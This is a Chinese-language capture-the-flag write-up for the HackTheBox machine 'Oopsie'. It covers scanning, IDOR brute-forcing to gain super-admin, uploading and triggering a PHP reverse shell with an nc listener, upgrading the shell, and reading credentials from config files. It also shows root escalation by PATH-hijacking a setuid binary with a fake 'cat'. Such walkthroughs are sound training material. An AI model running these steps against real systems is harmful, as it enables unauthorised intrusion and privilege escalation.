# 原创
：  HackTheBox-Oopsie

# HackTheBox-Oopsie

#### HackTheBox-Oopsie

## 连接配置

> 
参考之前写的连接配置，[文章链接](https://blog.csdn.net/LYJ20010728/article/details/119116747?spm=1001.2014.3001.5502)


## 信息搜集

> 
Kali中使用Nmap进行扫描：`nmap -sS -A 10.10.10.28`


```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sS -A 10.10.10.28                      
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 09:57 EDT
Nmap scan report for localhost (10.10.10.28)
Host is up (0.68s latency).                                                                                                                                                                                                                  
Not shown: 998 closed ports                                                                                                                                                                                                                  
PORT   STATE SERVICE VERSION                                                                                                                                                                                                                 
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                                                                                            
| ssh-hostkey:                                                                                                                                                                                                                               
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)                                                                                                                                                                               
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)                                                                                                                                                                              
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)                                                                                                                                                                            
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                                                                                                                                                                          
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                                                                 
|_http-title: Welcome                                                                                                                                                                                                                        
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                                                                                                          
TCP/IP fingerprint:                                                                                                                                                                                                                          
OS:SCAN(V=7.91%E=4%D=7/26%OT=22%CT=1%CU=44688%PV=Y%DS=2%DC=T%G=Y%TM=60FEBFB                                                                                                                                                                  
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS                                                                                                                                                                  
OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1                                                                                                                                                                  
OS:1NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN                                                                                                                                                                  
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A                                                                                                                                                                  
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R                                                                                                                                                                  
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F                                                                                                                                                                  
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%                                                                                                                                                                  
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD                                                                                                                                                                  
OS:=S)                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                             
Network Distance: 2 hops                                                                                                                                                                                                                     
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   575.15 ms localhost (10.10.16.1)
2   291.04 ms localhost (10.10.10.28)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.90 seconds

```

## 路径泄露

> 
查看页面发现关键词：`Please login to get access to the service.`，F12查看network，发现登陆点


## 网页登陆

> 
访问：`http://10.10.10.28/cdn-cgi/login`，这里的账号是admin密码是上一个场景已经获得的MEGACORP_4dm1n!!，登录后跳转到门户页面


## 越权

> 
发现Upload选项，但是需要Super Admin权限才行


> 
观察网页可以发现，Account页面的url有一个参数id，与此同时可以发现存在一个Access ID，用burp suite抓包后发现Access ID就是cookie识别身份的，利用burp suite爆破一下id


> 
在终端内用循环生成数字1~100到payload.txt内


```
for i in `seq 1 100`; do echo $i &gt;&gt;2.txt;done;

```

> 
接着使用burp suite的Intruder模块进行自动化攻击


> 
发现当id=30时，得到的返回包显示Access ID是86575，name是super admin


## 文件上传

> 
由于上一步得到了越权的方法，这里抓一个Upload页面请求包，然后修改请求包的id，cookie以及role，测试发现成功越权，可以上传文件了


## 反弹webshell

> 
我们将kali自带的php webshell复制到桌面上，修改本机地址和监听端口


> 
再次改包上传webshell文件


> 
由于不知道上传位置，采用dirsearch进行扫描<br/> 根据扫描的结果猜测上传的文件在`http://10.10.10.28/uploads/`下


> 
启用netcat监听设置的端口来接收webshell


```
nc nvvlp 1234

```

> 
使用curl来触发php从而反弹webshell


```
curl http://10.10.10.28/uploads/php-reverse-shell.php

```

> 
切回nc的终端，nc成功接收到webshell，反弹webshell成功


## 升级shell

> 



> 
用netcat获得的shell是非交互式的，不能传递tab来进行补全，不能使用su、nano，也不能执行ctrl+c等命令，所以我们需要升级为交互式的shell


```
SHELL=/bin/bash script -q /dev/null			//见注解1
Ctrl-Z										//见注解2
stty raw -echo								//见注解3
fg											//见注解4
reset										//见注解5
xterm										//见注解6

```

> 
- 将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容（这里感谢一下Faz和众多好友的探讨）- 将netcat暂挂至后台- 将本地终端置于原始模式，以免干扰远程终端- 将netcat返回到前台，注意：这里不会显示输入的命令- 重置远程终端，经测试也可以不进行此操作- 运行xterm


> 
执行完上述操作后，我们会获得一个交互式的shell，可以执行su、ctrl+c等命令，且可以tab自动补全了


## 横向移动

> 
翻阅信息发现在`/var/www/html/cdn-cgi/login`目录中存在一个数据库的连接信息db.php，里面包含用户名为robert，密码为M3g4C0rpUs3r!的用户凭证


> 
这样，我们可以用su命令并输入密码来切换用户


> 
在这里可以找到位于robert用户根目录下的user.txt，拿到User Own的Flag


## 提权

> 
使用id命令发现robert用户属于bugtracker组，我们可以尝试查找此组是否具有特殊的访问权限


```
find / -type f -group bugtracker 2&gt;/dev/null 			//-type f 为查找普通文档，-group bugtracker 限定查找的组为bugtracker，2&gt;/dev/null 将错误输出到黑洞（不显示）
ls -al /usr/bin/bugtracker								//-al 以长格式方式显示并且显示隐藏文件

```

> 
发现拥有者有s（setuid）特殊权限，可执行的文件搭配这个权限，可以得到特权，任意存取该文件的所有者能使用的全部系统资源，尝试运行，发现这个文件根据提供的ID值输出以该数字为编号的bug报告


> 
用strings命令查看一下这个文件内容


```
robert@oopsie:~$ strings /usr/bin/bugtracker
strings /usr/bin/bugtracker
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
strcpy
__isoc99_scanf
__stack_chk_fail
putchar
printf
strlen
malloc
strcat
system
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 
---------------
cat /root/reports/
;*3$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7697
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
test.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
putchar@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
strcpy@@GLIBC_2.2.5
_edata
strlen@@GLIBC_2.2.5
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
concat
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
malloc@@GLIBC_2.2.5
__bss_start
main
__isoc99_scanf@@GLIBC_2.7
strcat@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment

```

> 
观察发现 `cat /root/reports/`：


> 



```
export PATH=/tmp:$PATH				//将/tmp目录设置为环境变量
cd /tmp/							//切换到/tmp目录下
echo '/bin/sh' &gt; cat				//在此构造恶意的cat命令
chmod +x cat						//赋予执行权限

```

> 
这样bugtracker再次调用cat命令时实际上调用的是/tmp目录下的恶意的cat命令，我们运行一下bugtracker可以看出，此时robert用户临时具有了root权限，执行id命令发现只是robert用户的uid变为了root，不是真正的root用户


> 
然后可以找到/root目录下的root.txt拿到SYSTEM OWN的Flag (需要注意的是此时cat命令已被替换无法读取文件，可以使用more命令)


## 下一场景相关信息

> 
在/root/.config/filezilla目录下有一个FileZilla配置文件filezilla.xml，里面包含明文的FTP用户凭据ftpuser/mc@F1l3ZilL4，用于下一个靶机的渗透测试


> 
filezilla.xml内容


```
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;
&lt;FileZilla3&gt;
    &lt;RecentServers&gt;
        &lt;Server&gt;
            &lt;Host&gt;10.10.10.46&lt;/Host&gt;
            &lt;Port&gt;21&lt;/Port&gt;
            &lt;Protocol&gt;0&lt;/Protocol&gt;
            &lt;Type&gt;0&lt;/Type&gt;
            &lt;User&gt;ftpuser&lt;/User&gt;
            &lt;Pass&gt;mc@F1l3ZilL4&lt;/Pass&gt;
            &lt;Logontype&gt;1&lt;/Logontype&gt;
            &lt;TimezoneOffset&gt;0&lt;/TimezoneOffset&gt;
            &lt;PasvMode&gt;MODE_DEFAULT&lt;/PasvMode&gt;
            &lt;MaximumMultipleConnections&gt;0&lt;/MaximumMultipleConnections&gt;
            &lt;EncodingType&gt;Auto&lt;/EncodingType&gt;
            &lt;BypassProxy&gt;0&lt;/BypassProxy&gt;
        &lt;/Server&gt;
    &lt;/RecentServers&gt;
&lt;/FileZilla3&gt;

```
